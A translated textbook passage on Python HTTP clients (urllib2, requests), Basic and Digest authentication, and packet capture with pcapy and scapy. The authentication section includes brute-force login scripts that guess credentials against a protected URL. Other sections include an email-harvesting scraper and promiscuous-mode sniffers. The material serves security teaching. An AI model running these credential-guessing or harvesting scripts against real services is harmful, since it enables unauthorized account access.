# 精通 Python 网络安全（二）

> 原文：[`zh.annas-archive.org/md5/2fd2c4f6d02f5009e067781f7b1aee0c`](https://zh.annas-archive.org/md5/2fd2c4f6d02f5009e067781f7b1aee0c)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第四章：HTTP 编程

本章将向您介绍 HTTP 协议，并介绍如何使用 Python 检索和操作 Web 内容。我们还将回顾`urllib`标准库和`requests`包。`urllib2`是用于获取 URL 的 Python 模块。它提供了一个非常简单的接口，以`urlopen`函数的形式。如果我们想要向 API 端点发出请求以简化 HTTP 工作流程，请求包是一个非常有用的工具。

本章将涵盖以下主题：

+   理解 HTTP 协议和在 Python 中构建 HTTP 客户端

+   理解`urllib`包以查询 REST API

+   理解`requests`包以查询 REST API

+   理解不同的身份验证机制以及它们在 Python 中的实现方式

# 技术要求

本章的示例和源代码可在 GitHub 存储库的`第四章`文件夹中找到：[`github.com/PacktPublishing/Mastering-Python-for-Networking-and-Security.`](https://github.com/PacktPublishing/Mastering-Python-for-Networking-and-Security.)

您需要在本地计算机上安装 Python 发行版，并对 HTTP 协议有一些基本的了解。

# HTTP 协议和在 Python 中构建 HTTP 客户端

在本节中，我们将介绍 HTTP 协议以及如何使用 httplib 构建 HTTP 客户端。HTTP 是一个应用层协议，基本上由两个元素组成：客户端发出的请求，该请求从服务器请求由 URL 指定的特定资源，以及服务器发送的响应，提供客户端请求的资源。

# HTTP 协议介绍

HTTP 协议是一种无状态的超文本数据传输协议，不存储客户端和服务器之间交换的信息。该协议定义了客户端、代理和服务器必须遵循的规则以交换信息。

作为存储与 HTTP 事务相关信息的无状态协议，有必要采用其他技术，如 cookie（存储在客户端上的值）或会话（用于在服务器端临时存储有关一个或多个 HTTP 事务的信息的临时内存空间）。

服务器返回一个 HTTP 代码，指示客户端请求的操作结果；此外，头部可以在请求中使用，以在请求和响应中包含额外信息。

HTTP 协议在最低级别使用套接字来建立客户端和服务器之间的连接。在 Python 中，我们有可能使用一个更高级别的模块，它将我们从低级别套接字的操作中抽象出来。

# 使用 httplib 构建 HTTP 客户端

Python 提供了一系列模块来创建 HTTP 客户端。Python 提供的标准库中的模块有`httplib`、`urllib`和`urllib2`。这些模块在所有模块中具有不同的功能，但它们对于大多数 Web 测试都是有用的。我们还可以找到提供一些改进的`httplib`模块和请求的包。

该模块定义了一个实现`HTTPConnection`类的类。

该类接受主机和端口作为参数。主机是必需的，端口是可选的。该类的实例表示与 HTTP 服务器的交易。必须通过传递服务器标识符和可选的端口号来实例化它。如果未指定端口号，则如果服务器标识字符串具有主机：端口的形式，则提取端口号，否则使用默认的 HTTP 端口（80）。

您可以在`request_httplib.py`文件中找到以下代码：

```py
import httplib

connection = httplib.HTTPConnection("www.packtpub.com")
connection.request("GET", "/networking-and-servers/mastering-python-networking-and-security")
response = connection.getresponse()
print response
print response.status, response.reason
data = response.read()
print data
```

# 使用 urllib2 构建 HTTP 客户端

在本节中，我们将学习如何使用`urllib2`以及如何使用该模块构建 HTTP 客户端。

# 介绍 urllib2

`urllib2`可以使用各种协议（如 HTTP、HTTPS、FTP 或 Gopher）从 URL 读取数据。该模块提供了`urlopen`函数，用于创建类似文件的对象，可以从 URL 读取数据。该对象具有诸如`read()`、`readline()`、`readlines()`和`close()`等方法，其工作方式与文件对象完全相同，尽管实际上我们正在使用一个抽象我们免于使用底层套接字的包装器。

`read`方法，正如您记得的那样，用于读取完整的“文件”或作为参数指定的字节数，readline 用于读取一行，readlines 用于读取所有行并返回一个包含它们的列表。

我们还有一些`geturl`方法，用于获取我们正在读取的 URL（这对于检查是否有重定向很有用），以及返回一个带有服务器响应头的对象的 info（也可以通过 headers 属性访问）。

在下一个示例中，我们使用`urlopen()`打开一个网页。当我们将 URL 传递给`urlopen()`方法时，它将返回一个对象，我们可以使用`read()`属性以字符串格式获取该对象的数据。

您可以在`urllib2_basic.py`文件中找到以下代码：

```py
import urllib2
try:
    response = urllib2.urlopen("http://www.python.org")
    print response.read()
    response.close()
except HTTPError, e:
    print e.code
except URLError, e:
    print e.reason
```

使用`urllib2`模块时，我们还需要处理错误和异常类型`URLError`。如果我们使用 HTTP，还可以在`URLError`的子类`HTTPError`中找到错误，当服务器返回 HTTP 错误代码时会抛出这些错误，比如当资源未找到时返回 404 错误。

`urlopen`函数有一个可选的数据参数，用于使用 POST 发送信息到 HTTP 地址（参数在请求本身中发送），例如响应表单。该参数是一个正确编码的字符串，遵循 URL 中使用的格式。

# 响应对象

让我们详细探讨响应对象。我们可以在前面的示例中看到`urlopen()`返回`http.client.HTTPResponse`类的实例。响应对象返回有关请求的资源数据以及响应的属性和元数据。

以下代码使用 urllib2 进行简单的请求：

```py
>>> response = urllib2.urlopen('http://www.python.org')
>>> response.read()
b'<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
"http://www.w3.org/TR/html4/strict.dtd">\n<html
>>> response.read(100)
```

`read()`方法允许我们读取请求的资源数据并返回指定的字节数。

# 状态码

我们可以使用其**status**属性读取响应的状态码。200 的值是一个告诉我们请求 OK 的 HTTP 状态码：

```py
>>> response.status
200
```

状态码分为以下几组：

+   **100:** 信息

+   **200:** 成功

+   **300:** 重定向

+   **400:** 客户端错误

+   **500:** 服务器错误

# 使用 urllib2 检查 HTTP 头

HTTP 请求由两个主要部分组成：头部和主体。头部是包含有关响应的特定元数据的信息行，告诉客户端如何解释它。使用此模块，我们可以检查头部是否可以提供有关 Web 服务器的信息。

`http_response.headers`语句提供了 Web 服务器的头部。在访问此属性之前，我们需要检查响应代码是否等于`200`。

您可以在`urllib_headers_basic.py`文件中找到以下代码：

```py
import urllib2
url = raw_input("Enter the URL ")
http_response = urllib2.urlopen(url)
print 'Status Code: '+ str(http_response.code)
if http_response.code == 200:
    print http_response.headers
```

在下面的截图中，我们可以看到脚本在 python.org 域上执行：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/3bff218f-4c01-4cae-8d3d-815f784da3ca.png)

此外，您还可以获取头部的详细信息：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/8da41655-5f6d-4a6f-bdda-0625c41acb8d.png)

检索响应头的另一种方法是使用响应对象的`info()`方法，它将返回一个字典：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/89591d31-8be7-41e9-8a6b-043834987c4a.png)

我们还可以使用`**keys()**`方法获取所有响应头键：

```py
>>> print response_headers.keys()
['content-length', 'via', 'x-cache', 'accept-ranges', 'x-timer', 'vary', 'strict-transport-security', 'server', 'age', 'connection', 'x-xss-protection', 'x-cache-hits', 'x-served-by', 'date', 'x-frame-options', 'content-type', 'x-clacks-overhead']
```

# 使用 urllib2 的 Request 类

`urllib2`的`urlopen`函数还可以将 Request 对象作为参数，而不是 URL 和要发送的数据。Request 类定义了封装与请求相关的所有信息的对象。通过这个对象，我们可以进行更复杂的请求，添加我们自己的头部，比如 User-Agent。

Request 对象的最简构造函数只接受一个字符串作为参数，指示要连接的 URL，因此将此对象作为 urlopen 的参数将等同于直接使用 URL 字符串。

但是，Request 构造函数还有一个可选参数，用于通过 POST 发送数据的数据字符串和标头字典。

# 使用 urllib2 自定义请求

我们可以自定义请求以检索网站的特定版本。为此任务，我们可以使用 Accept-Language 标头，告诉服务器我们首选的资源语言。

在本节中，我们将看到如何使用 User-Agent 标头添加我们自己的标头。User-Agent 是一个用于识别我们用于连接到该 URL 的浏览器和操作系统的标头。默认情况下，urllib2 被标识为“Python-urllib / 2.5”；如果我们想要将自己标识为 Chrome 浏览器，我们可以重新定义标头参数。

在这个例子中，我们使用 Request 类创建相同的 GET 请求，通过将自定义的 HTTP User-Agent 标头作为参数传递：

您可以在`urllib_requests_headers.py`文件中找到以下代码：

```py
import urllib2
url = "http://www.python.org"
headers= {'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.117 Safari/537.36'}
request = urllib2.Request(url,headers=headers)
response = urllib2.urlopen(request)
# Here we check response headers
if response.code == 200:
    print(response.headers)
```

使用`urllib`模块的 Request 类，可以创建自定义标头，为此需要在标头参数中定义一个带有键和值格式的标头字典。在上一个例子中，我们设置了代理标头配置，并将其分配为 Chrome 值，并将标头作为字典提供给 Request 构造函数。

# 使用 urllib2 从 URL 获取电子邮件

在这个例子中，我们可以看到如何使用 urllib2 和正则表达式提取电子邮件。

您可以在`get_emails_from_url.py`文件中找到以下代码：

```py
import urllib2
import re
#enter url
web =  raw_input("Enter url: ")
#https://www.packtpub.com/books/info/packt/terms-and-conditions
#get response form url
response = urllib2.Request('http://'+web)
#get content page from response
content = urllib2.urlopen(response).read()
#regular expression
pattern = re.compile("[-a-zA-Z0-9._]+@[-a-zA-Z0-9_]+.[a-zA-Z0-9_.]+")
#get mails from regular expression
mails = re.findall(pattern,content)
print(mails)

```

在这个屏幕截图中，我们可以看到 packtpub.com 域的脚本正在执行：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/44ec2eea-dcbe-4720-bd07-2d0de1bdd9dd.png)

# 使用 urllib2 从 URL 获取链接

在这个脚本中，我们可以看到如何使用`urllib2`和`HTMLParser`提取链接。`HTMLParser`是一个允许我们解析 HTML 格式的文本文件的模块。

您可以在[`docs.python.org/2/library/htmlparser.html`](https://docs.python.org/2/library/htmlparser.html)获取更多信息。

您可以在`get_links_from_url.py`文件中找到以下代码：

```py
#!/usr/bin/python
import urllib2
from HTMLParser import HTMLParser
class myParser(HTMLParser):
    def handle_starttag(self, tag, attrs):
        if (tag == "a"):
            for a in attrs:
                if (a[0] == 'href'):
                    link = a[1]
                    if (link.find('http') >= 0):
                        print(link)
                        newParse = myParser()
                        newParse.feed(link)

web =  raw_input("Enter url: ")
url = "http://"+web
request = urllib2.Request(url)
handle = urllib2.urlopen(request)
parser = myParser()
parser.feed(handle.read().decode('utf-8'))
```

在以下截图中，我们可以看到 python.org 域的脚本正在执行：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/276cc13e-834b-4a2a-bedf-942e292279d9.png)

# 使用 requests 构建 HTTP 客户端

能够与基于 HTTP 的 RESTful API 进行交互是任何编程语言项目中越来越常见的任务。在 Python 中，我们还可以使用`Requests`模块以简单的方式与 REST API 进行交互。在本节中，我们将回顾使用`Python Requests`包与基于 HTTP 的 API 进行交互的不同方式。

# 请求简介

在 Python 生态系统中进行 HTTP 请求的最佳选择之一是第三方请求库。您可以使用`pip`命令轻松在系统中安装 requests 库：

```py
pip install requests
```

该模块在 PyPi 存储库中可用，名称为`requests`包。它可以通过 Pip 安装，也可以从[`docs.python-requests.org`](http://docs.python-requests.org)下载，该网站提供了文档。

要在我们的脚本中测试该库，只需像其他模块一样导入它。基本上，request 是`urllib2`的一个包装器，以及其他 Python 模块，为我们提供了与 REST 结构的简单方法，因为我们有“post”，“get”，“put”，“patch”，“delete”，“head”和“options”方法，这些都是与 RESTful API 通信所需的方法。

这个模块有一个非常简单的实现形式，例如，使用 requests 进行`GET`查询将是：

```py
>>> import requests
>>> response = requests.get('http://www.python.org')
```

正如我们在这里看到的，requests.get 方法返回一个“response”对象；在这个对象中，您将找到与我们请求的响应对应的所有信息。

这些是响应对象的主要属性：

+   **response.status_code**：这是服务器返回的 HTTP 代码。

+   **response.content**：在这里我们将找到服务器响应的内容。

+   **response.json()**：如果答案是 JSON，这个方法会序列化字符串并返回一个带有相应 JSON 结构的字典结构。如果每个响应都没有收到 JSON，该方法会触发一个异常。

在这个脚本中，我们还可以通过 python.org 域中的响应对象查看请求属性。

您可以在**`requests_headers.py`**文件中找到以下代码：

```py
import requests, json
print("Requests Library tests.")
response = requests.get("http://www.python.org")
print(response.json)
print("Status code: "+str(response.status_code))
print("Headers response: ")
for header, value in response.headers.items():
    print(header, '-->', value)

print("Headers request : ")
for header, value in response.request.headers.items():
    print(header, '-->', value)

```

在下面的屏幕截图中，我们可以看到 python.org 域的脚本正在执行。

在执行的最后一行，我们可以看到**User-Agent**标头中存在**python-requests**：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/93c9b235-8b16-44cd-b09d-2aeb8299b1ae.png)

以类似的方式，我们只能从对象响应字典中获得`keys()`。

您可以在`requests_headers_keys.py`文件中找到以下代码：

```py
import requests
if __name__ == "__main__":
 response = requests.get("http://www.python.org")
 for header in response.headers.keys():
 print(header + ":" + response.headers[header])
```

# 请求的优势

在`requests`模块的主要优势中，我们可以注意到以下几点：

+   一个专注于创建完全功能的 HTTP 客户端的库。

+   支持 HTTP 协议中定义的所有方法和特性。

+   它是“Pythonic”的，也就是说，它完全是用 Python 编写的，所有操作都是以简单的方式和只有几行代码完成的。

+   诸如与 web 服务集成、HTTP 连接的汇集、在表单中编码 POST 数据以及处理 cookies 等任务。所有这些特性都是使用 Requests 自动处理的。

# 使用 REST API 进行 GET 请求

为了使用这个模块进行请求测试，我们可以使用[`httpbin.org`](http://httpbin.org)服务并尝试这些请求，分别执行每种类型。在所有情况下，执行以获得所需输出的代码将是相同的，唯一变化的将是请求类型和发送到服务器的数据：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/36067bfe-7767-42c3-9d83-1dfe4f7538b4.png)

[`httpbin.org`](http://httpbin.org) [提供了一个服务，让您通过预定义的端点使用 get、post、patch、put 和 delete 方法来测试 REST 请求。](http://httpbin.org)

您可以在`testing_api_rest_get_method.py`文件中找到以下代码：

```py
import requests,json
response = requests.get("http://httpbin.org/get",timeout=5)
# we then print out the http status_code
print("HTTP Status Code: " + str(response.status_code))
print(response.headers)
if response.status_code == 200:
    results = response.json()
    for result in results.items():
        print(resul)

    print("Headers response: ")
    for header, value in response.headers.items():
        print(header, '-->', value)

    print("Headers request : ")
    for header, value in response.request.headers.items():
        print(header, '-->', value)
    print("Server:" + response.headers['server'])
else:
    print("Error code %s" % response.status_code)
```

当您运行上述代码时，您应该看到为请求和响应获取的标头的以下输出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/a6a89921-2970-40b9-9434-a6c6a7ab02af.png)

# 使用 REST API 进行 POST 请求

与将数据发送到 URL 的 GET 方法不同，POST 方法允许我们将数据发送到请求的正文中。

例如，假设我们有一个用于注册用户的服务，您必须通过数据属性传递 ID 和电子邮件。这些信息将通过数据属性通过字典结构传递。post 方法需要一个额外的字段叫做“data”，我们通过这个字段发送一个包含我们将通过相应方法发送到服务器的所有元素的字典。

在这个例子中，我们将模拟通过 POST 请求发送 HTML 表单，就像浏览器在向网站发送表单时所做的那样。表单数据总是以键值字典格式发送。

POST 方法在[`httpbin.org/post`](http://httpbin.org/post)服务中可用：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/1cc80100-be73-4344-9850-b8124eb1d97e.png)

在下面的代码中，我们定义了一个数据字典，我们正在使用它与 post 方法一起传递请求正文中的数据：

```py
>>> data_dictionary = {"id": "0123456789"}
>>> url = "http://httpbin.org/post"
>>> response = requests.post(url, data=data_dictionary)
```

有些情况下，服务器要求请求包含标头，指示我们正在使用 JSON 格式进行通信；对于这些情况，我们可以添加自己的标头或使用**“headers”**参数修改现有的标头：

```py
>>> data_dictionary = {"id": "0123456789"}
>>> headers = {"Content-Type" : "application/json","Accept":"application/json"}
>>> url = "http://httpbin.org/post"
>>> response = requests.post(url, data=data_dictionary,headers=headers)
```

在这个例子中，除了使用 POST 方法，您还必须将要发送到服务器的数据作为数据属性中的参数传递。在答案中，我们看到 ID 是如何被发送到表单对象中的。

# 进行代理请求

`requests`模块提供的一个有趣功能是可以通过代理或内部网络与外部网络之间的中间机器进行请求。

代理的定义方式如下：

```py
>>> proxy = {"protocol":"ip:port", ...}
```

通过代理进行请求时，使用 get 方法的 proxies 属性：

```py
>>> response = requests.get(url,headers=headers,proxies=proxy)
```

代理参数必须以字典形式传递，即必须创建一个指定协议、IP 地址和代理监听端口的字典类型：

```py
import requests
http_proxy = "http://<ip_address>:<port>"
proxy_dictionary = { "http" : http_proxy}
requests.get("http://example.org", proxies=proxy_dictionary)
```

# 使用 requests 处理异常

请求中的错误与其他模块处理方式不同。以下示例生成了一个 404 错误，表示无法找到请求的资源：

```py
>>> response = requests.get('http://www.google.com/pagenotexists')
>>> response.status_code
404
```

在这种情况下，`requests`模块返回了一个 404 错误。要查看内部生成的**异常**，我们可以使用`raise_for_status()`方法：

```py
>>> response.raise_for_status()
requests.exceptions.HTTPError: 404 Client Error
```

如果向不存在的主机发出请求，并且一旦产生了超时，我们会得到一个`ConnectionError`异常：

```py
>>> r = requests.get('http://url_not_exists')
requests.exceptions.ConnectionError: HTTPConnectionPool(...
```

在这个屏幕截图中，我们可以看到在 Python 空闲中执行之前的命令：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/9f4f5df0-2856-4f83-8f5d-ec1217064cd3.png)

与 urllib 相比，请求库使得在 Python 中使用 HTTP 请求更加容易。除非有使用 urllib 的要求，我总是建议在 Python 项目中使用 Requests。

# Python 中的身份验证机制

HTTP 协议本身支持的身份验证机制是**HTTP 基本**和**HTTP 摘要**。这两种机制都可以通过 Python 的 requests 库来支持。

HTTP 基本身份验证机制基于表单，并使用 Base64 对由“冒号”（用户：密码）分隔的用户组成进行编码。

HTTP 摘要身份验证机制使用 MD5 加密用户、密钥和领域哈希。两种方法之间的主要区别在于基本只进行编码，而不实际加密，而摘要会以 MD5 格式加密用户信息。

# 使用 requests 模块进行身份验证

使用`requests`模块，我们可以连接支持基本和摘要身份验证的服务器。使用基本身份验证，用户和密码的信息以`base64`格式发送，而使用摘要身份验证，用户和密码的信息以`md5`或`sha1`算法的哈希形式发送。

# HTTP 基本身份验证

HTTP 基本是一种简单的机制，允许您在 HTTP 资源上实现基本身份验证。其主要优势在于可以在 Apache Web 服务器中轻松实现，使用标准 Apache 指令和 httpasswd 实用程序。

这种机制的问题在于，使用 Wireshark 嗅探器相对简单地获取用户凭据，因为信息是以明文发送的；对于攻击者来说，解码 Base64 格式的信息就足够了。如果客户端知道资源受到此机制的保护，可以使用 Base64 编码的 Authorization 标头发送登录名和密码。

基本访问身份验证假定客户端将通过用户名和密码进行标识。当浏览器客户端最初使用此系统访问站点时，服务器会以包含“**WWW-Authenticate**”标签的 401 响应进行回复，其中包含“Basic”值和受保护域的名称（例如 WWW-Authenticate：Basic realm =“www.domainProtected.com”）。

浏览器用“Authorization”标签回应服务器，其中包含“Basic”值和登录名、冒号标点符号（“：”）和密码的 Base64 编码连接（例如，Authorization：Basic b3dhc3A6cGFzc3dvcmQ =）。

假设我们有一个受到此类身份验证保护的 URL，在 Python 中使用`requests`模块，如下所示：

```py
import requests
encoded = base64.encodestring(user+":"+passwd)
response = requests.get(protectedURL, auth=(user,passwd))
```

我们可以使用此脚本来测试对受保护资源的访问，使用**基本身份验证。**在此示例中，我们应用了**暴力破解过程**来获取受保护资源上的用户和密码凭据。

您可以在`BasicAuthRequests.py`文件中找到以下代码：

```py
import base64
import requests
users=['administrator', 'admin']
passwords=['administrator','admin']
protectedResource = 'http://localhost/secured_path'
foundPass = False
for user in users:
    if foundPass:
        break
    for passwd in passwords:
        encoded = base64.encodestring(user+':'+passwd)
        response = requests.get(protectedResource, auth=(user,passwd))
        if response.status_code != 401:
            print('User Found!')
            print('User: %s, Pass: %s' %(user,passwd))
            foundPass=True
            break
```

# HTTP 摘要身份验证

HTTP 摘要是用于改进 HTTP 协议中基本身份验证过程的机制。通常使用 MD5 来加密用户信息、密钥和领域，尽管其他算法，如 SHA，也可以在其不同的变体中使用，从而提高安全性。它在 Apache Web 服务器中实现了`mod_auth_digest`模块和`htdigest`实用程序。

客户端必须遵循的过程以发送响应，从而获得对受保护资源的访问是：

+   `Hash1= MD5(“user:realm:password”)`

+   `Hash2 = MD5(“HTTP-Method-URI”)`

+   `response = MD5(Hash1:Nonce:Hash2)`

基于摘要的访问身份验证通过使用单向哈希加密算法（MD5）扩展基本访问身份验证，首先加密认证信息，然后添加唯一的连接值。

客户端浏览器在计算密码响应的哈希格式时使用该值。尽管密码通过使用加密哈希和唯一值的使用来防止重放攻击的威胁，但登录名以明文形式发送。

假设我们有一个受此类型身份验证保护的 URL，在 Python 中将如下所示：

```py
import requests
from requests.auth import HTTPDigestAuth
response = requests.get(protectedURL, auth=HTTPDigestAuth(user,passwd))
```

我们可以使用此脚本来测试对受保护资源的访问**摘要身份验证。**在此示例中，我们应用了**暴力破解过程**来获取受保护资源上的用户和密码凭据。该脚本类似于基本身份验证的先前脚本。主要区别在于我们发送用户名和密码的部分，这些用户名和密码是通过 protectedResource URL 发送的。

您可以在`DigestAuthRequests.py`文件中找到以下代码：

```py
import requests
from requests.auth import HTTPDigestAuth
users=['administrator', 'admin']
passwords=['administrator','admin']
protectedResource = 'http://localhost/secured_path'
foundPass = False
for user in users:
 if foundPass:
     break
 for passwd in passwords:
     res = requests.get(protectedResource)
     if res.status_code == 401:
         resDigest = requests.get(protectedResource, auth=HTTPDigestAuth(user, passwd))
         if resDigest.status_code == 200:
             print('User Found...')
             print('User: '+user+' Pass: '+passwd)
             foundPass = True
```

# 摘要

在本章中，我们研究了`httplib`和`urllib`模块，以及用于构建 HTTP 客户端的请求。如果我们想要从 Python 应用程序消耗 API 端点，`requests`模块是一个非常有用的工具。在最后一节中，我们回顾了主要的身份验证机制以及如何使用`request`模块实现它们。在这一点上，我想强调的是，始终阅读我们使用的所有工具的官方文档非常重要，因为那里可以解决更具体的问题。

在下一章中，我们将探索 Python 中的网络编程包，使用`pcapy`和`scapy`模块来分析网络流量。

# 问题

1.  哪个模块是最容易使用的，因为它旨在简化对 REST API 的请求？

1.  如何通过传递字典类型的数据结构来进行 POST 请求，该请求将被发送到请求的正文中？

1.  通过代理服务器正确进行 POST 请求并同时修改标头信息的方法是什么？

1.  如果我们需要通过代理发送请求，需要构建哪种数据结构？

1.  如果在响应对象中有服务器的响应，我们如何获得服务器返回的 HTTP 请求的代码？

1.  我们可以使用哪个模块来指示我们将使用 PoolManager 类预留的连接数？

1.  请求库的哪个模块提供了执行摘要类型身份验证的可能性？

1.  基本身份验证机制使用哪种编码系统来发送用户名和密码？

1.  通过使用单向哈希加密算法（MD5）来改进基本身份验证过程使用了哪种机制？

1.  哪个标头用于识别我们用于向 URL 发送请求的浏览器和操作系统？

# 进一步阅读

在这些链接中，您将找到有关提到的工具的更多信息，以及一些被注释模块的官方 Python 文档：

+   [`docs.python.org/2/library/httplib.html`](https://docs.python.org/2/library/httplib.html)

+   [`docs.python.org/2/library/urllib2.html`](https://docs.python.org/2/library/urllib2.html)

+   [`urllib3.readthedocs.io/en/latest/`](http://urllib3.readthedocs.io/en/latest/)

+   [`docs.python.org/2/library/htmlparser.html`](https://docs.python.org/2/library/htmlparser.html)

+   [`docs.python-requests.org/en/latest`](http://docs.python-requests.org/en/latest)


# 第五章：分析网络流量

本章将介绍使用 Python 中的 pcapy 和 scapy 模块分析网络流量的一些基础知识。这些模块为调查员提供了编写小型 Python 脚本来调查网络流量的能力。调查员可以编写 scapy 脚本来调查通过嗅探混杂网络接口的实时流量，或者加载先前捕获的 pcap 文件。

本章将涵盖以下主题：

+   使用 pcapy 包在网络上捕获和注入数据包

+   使用 scapy 包捕获、分析、操作和注入网络数据包

+   使用 scapy 包在网络中进行端口扫描和跟踪路由

+   使用 scapy 包读取 pcap 文件

# 技术要求

本章的示例和源代码可在 GitHub 存储库的`第五章`文件夹中找到：[`github.com/PacktPublishing/Mastering-Python-for-Networking-and-Security`](https://github.com/PacktPublishing/Mastering-Python-for-Networking-and-Security)。

您需要在本地计算机上安装 Python 发行版，并对数据包、捕获和使用诸如 Wireshark 之类的工具嗅探网络具有一些基本知识。还建议使用 Unix 发行版以便于安装和使用 scapy 以及执行命令。

# 使用 pcapy 捕获和注入数据包

在本节中，您将学习 pcapy 的基础知识以及如何捕获和读取数据包的头部。

# Pcapy 简介

Pcapy 是一个 Python 扩展模块，它与`libpcap`数据包捕获库进行接口。Pcapy 使 Python 脚本能够在网络上捕获数据包。Pcapy 在与其他 Python 类集合一起使用构建和处理数据包时非常有效。

您可以在[`github.com/CoreSecurity/pcapy`](https://github.com/CoreSecurity/pcapy)下载源代码和最新的稳定和开发版本。

要在 Ubuntu Linux 发行版上安装`python-pcapy`，请运行以下命令：

```py
sudo apt-get update
sudo apt-get install python-pcapy
```

# 使用 pcapy 捕获数据包

我们可以使用 pcapy 接口中的`open_live`方法来捕获特定设备中的数据包，并且可以指定每次捕获的字节数以及其他参数，如混杂模式和超时。

在下面的例子中，我们将计算捕获 eht0 接口的数据包。

您可以在**`capturing_packets.py`**文件中找到以下代码：

```py
#!/usr/bin/python
import pcapy
devs = pcapy.findalldevs()
print(devs)
#  device, bytes to capture per packet, promiscuous mode, timeout (ms)
cap = pcapy.open_live("eth0", 65536 , 1 , 0)
count = 1
while count:
    (header, payload) = cap.next()
    print(count)
    count = count + 1
```

# 从数据包中读取头部

在下面的例子中，我们正在捕获特定设备（`eth0`）中的数据包，并且对于每个数据包，我们获取头部和有效载荷，以提取有关 Mac 地址、IP 头和协议的信息。

您可以在**`reading_headers.py`**文件中找到以下代码：

```py
#!/usr/bin/python
import pcapy
from struct import *
cap = pcapy.open_live("eth0", 65536, 1, 0)
while 1:
    (header,payload) = cap.next()
    l2hdr = payload[:14]
    l2data = unpack("!6s6sH", l2hdr)
    srcmac = "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x" % (ord(l2hdr[0]), ord(l2hdr[1]), ord(l2hdr[2]), ord(l2hdr[3]), ord(l2hdr[4]), ord(l2hdr[5]))
    dstmac = "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x" % (ord(l2hdr[6]), ord(l2hdr[7]), ord(l2hdr[8]), ord(l2hdr[9]), ord(l2hdr[10]), ord(l2hdr[11]))
    print("Source MAC: ", srcmac, " Destination MAC: ", dstmac)
    # get IP header from bytes 14 to 34 in payload
    ipheader = unpack('!BBHHHBBH4s4s' , payload[14:34])
    timetolive = ipheader[5]
    protocol = ipheader[6]
    print("Protocol ", str(protocol), " Time To Live: ", str(timetolive))
```

# 使用 scapy 捕获和注入数据包

网络流量分析是拦截两个主机之间交换的数据包的过程，了解介入通信的系统的细节。消息和通信持续时间是监听网络媒介的攻击者可以获取的一些有价值的信息。

# 我们可以用 scapy 做什么？

Scapy 是用于网络操作的瑞士军刀。因此，它可以用于许多任务和领域：

+   通信网络研究

+   安全测试和道德黑客以操纵生成的流量

+   数据包捕获、处理和处理

+   使用特定协议生成数据包

+   显示有关特定包的详细信息

+   数据包捕获、制作和操作

+   网络流量分析工具

+   模糊协议和 IDS/IPS 测试

+   无线发现工具

# Scapy 的优点和缺点

以下是 Scapy 的一些优点：

+   支持多种网络协议

+   其 API 提供了在网络段中捕获数据包并在捕获每个数据包时执行函数所需的类

+   它可以在命令解释器模式下执行，也可以从 Python 脚本中以编程方式使用

+   它允许我们在非常低的级别上操纵网络流量

+   它允许我们使用协议堆栈并将它们组合起来

+   它允许我们配置每个协议的所有参数

此外，Scapy 也有一些弱点：

+   无法同时处理大量数据包

+   对某些复杂协议的部分支持

# Scapy 简介

`Scapy`是用 Python 编写的模块，用于操作支持多种网络协议的数据包。它允许创建和修改各种类型的网络数据包，实现了捕获和嗅探数据包的功能，然后对这些数据包执行操作。

`Scapy`是一种专门用于操作网络数据包和帧的软件。Scapy 是用 Python 编程语言编写的，可以在其**CLI（命令行解释器）**中交互使用，也可以作为 Python 程序中的库使用。

**Scapy 安装：**我建议在 Linux 系统上使用 Scapy，因为它是为 Linux 设计的。最新版本的 Scapy 确实支持 Windows，但在本章中，我假设您使用的是具有完全功能的 Scapy 安装的 Linux 发行版。要安装 Scapy，请访问[`www.secdev.org/projects/scapy`](http://www.secdev.org/projects/scapy)。安装说明在官方安装指南中有详细说明：[`scapy.readthedocs.io/en/latest/`](https://scapy.readthedocs.io/en/latest/)

# Scapy 命令

Scapy 为我们提供了许多用于调查网络的命令。我们可以以两种方式使用 Scapy：在终端窗口中交互式使用，或者通过将其作为 Python 脚本的库导入来以编程方式使用。

以下是可能有用的命令，可以详细显示 Scapy 的操作：

+   `**ls()**`：显示 Scapy 支持的所有协议

+   `**lsc()**`：显示 Scapy 支持的命令和函数列表

+   `**conf**`：显示所有配置选项

+   `**help()**`：显示特定命令的帮助信息，例如，help(sniff)

+   `**show()**`：显示特定数据包的详细信息，例如，Newpacket.show()

Scapy 支持大约 300 种网络协议。我们可以通过**ls()**命令来了解一下：

```py
scapy>ls()
```

屏幕截图显示了 ls()命令的执行，我们可以看到 Scapy 支持的一些协议：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/edfaf3de-5216-4501-a3f3-0028e4b2e7dd.png)

如果我们执行**ls()**命令，可以看到可以在特定层发送的参数，括号中指示我们想要更多信息的层：

```py
scapy>ls(IP)
scapy>ls(ICMP)
scapy>ls(TCP)
```

下一个屏幕截图显示了**ls(TCP)**命令的执行，我们可以看到 Scapy 中 TCP 协议支持的字段：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/1804705b-5e6a-46f0-ae6d-4a4521af6678.png)

```py
scapy>lsc()
```

通过`lsc()`命令，我们可以看到 Scapy 中可用的函数：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/3b545bf7-fec8-4173-921b-7ac83b913c65.png)

